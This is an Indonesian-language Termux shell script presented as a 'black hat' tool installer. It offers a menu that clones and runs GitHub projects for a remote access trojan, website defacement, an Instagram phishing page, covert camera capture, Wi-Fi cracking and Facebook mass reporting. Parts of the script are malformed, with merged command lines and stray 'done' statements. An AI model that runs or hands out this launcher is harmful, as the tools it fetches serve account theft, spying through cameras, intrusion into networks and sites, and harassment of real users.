#!/system/bin/sh

clear
sleep 1
echo "Loading...." | lolcat
sleep 4
echo "WELCOME" | lolcat
sleep 2
echo "===========================♪♪♪================"
echo "Author : Anang Black Ha"
echo "Whatsapp : 082629262××"
echo "YouTube : DEVICE Linux Channel"
echo "==========================================="
sleep 3
##############################
##############################


echo "[#] detected ctrl+c exit...."
echo "[#] JANGAN DI SALAH GUNAKAN"
sleep 1
echo""
echo "[#] BLACK HAT"

echo "Makasih.."
sleep 1



echo "=========©®==========" | lolcat
echo " WELCOME TO MY TOOLS" | lolcat
echo "•program by.Anang•" | lolcat
echo "YouTube : Device Linux" | lolcat
echo "========♠♪♠==========" | lolcat
cowsay -f meow "Hallo Programer" | lolcat
date
echo " DAFTAR PILIHAN TOOLS INSTALLER " | lolcat
echo "[1].GGMUx          [√]" | lolcat
echo "==================" | lolcat
echo "[2].A-Rat          [√]" | lolcat
echo "==================" | lolcat
echo "[3].Deface web     [√]" | lolcat
echo "==================" | lolcat
echo "[4]Instagram       [×]" | lolcat
echo "==================" | lolcat
echo "[5]Hack Camera     [√]" | lolcat
echo "================== " | lolcat
echo "[6]Wifi-Hacker     [ujicoba]" | lolcat
echo "=================="
echo "[7]Report FB.          [√]" | lolcat
echo""
echo "[00].exit"
read -p "pilih no |===> " pill;

case $pill in
1)clear
git clone https://github.com/muhammadfathul/GGMUX
cd GGMUX
chmod 777*
./ggmux.sh

;;

2)clear
git clone https://github.com/Xi4u7/A-Rat
cd A-Rat
chmod +x A-Rat.py
python2 A-Rat.py

;;

3)clear
git clone https://github.com/Amriez/AOCDEFACE              cd AOCDEFACE
sh AOC.sh

;;

4)clear
git clone https://github.com/viruz09/Instagram.git
cd Instagram
unzip Instagram.zip                                        cd ..
php -S localhost:8080 -t Instagram

;;

5)clear
pkg install openssh
pkg install mc
git clone https://github.com/thelinuxchoice/saycheese
cd saycheese
bash saycheese.sh

;;

6)clear
git clone https://github.com/esc0rtd3w/wifi-hacker
cd wifi-hacker
chmod +x wifi-hacker.sh
sh wifi-hacker.sh

;;

7)clear
pkg install unzip
pip2 install mechanize
git clone https://github.com/IlayTamvan/Report.git
cd Report
unzip Report.zip
python2 Report.py

;;

00)clear
exit
echo "SUBSCRIBE √"
exit

esac
done
done